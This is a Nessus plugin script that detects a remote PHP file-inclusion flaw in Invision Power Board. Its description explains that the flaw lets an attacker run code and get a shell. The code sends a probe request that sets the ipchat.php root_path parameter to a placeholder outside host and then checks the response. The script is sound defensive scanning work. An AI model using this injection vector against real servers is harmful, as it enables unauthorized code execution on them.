#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11273);
 script_bugtraq_id(6976, 7204);
 script_version ("$Revision: 1.8 $");
 
 name["english"] = "Invision PowerBoard code injection";

 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to make the remote host include php files hosted
on a third party server using Invision Power Board.

An attacker may use this flaw to inject arbitrary code in the remote
host and gain a shell with the privileges of the web server.

Solution : At this time, the vendor did not supply any patch
See also : http://www.frog-man.org/tutos/InvisionPowerBoard.txt (french)
           (note: this URL is no longer valid).
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of remotehtmlview.php";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 - 2005 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 - 2005 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl", "invision_power_board_detect.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


# Check each installed instance, stopping if we find a vulnerability.
installs = get_kb_list(string("www/", port, "/invision_power_board"));
if (isnull(installs)) exit(0);
foreach install (installs) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    ver = matches[1];
    dir = matches[2];

    req = http_get(item:string(dir, "/ipchat.php?root_path=http://xxxxxxxx/"),
	port:port);
    r = http_keepalive_send_recv(port:port, data:req);
    if( r == NULL )exit(0);
    if(egrep(pattern:".*http://xxxxxxxx/conf_global.php.*", string:r))
    {
      security_hole(port);
      exit(0);
    }
  }
}
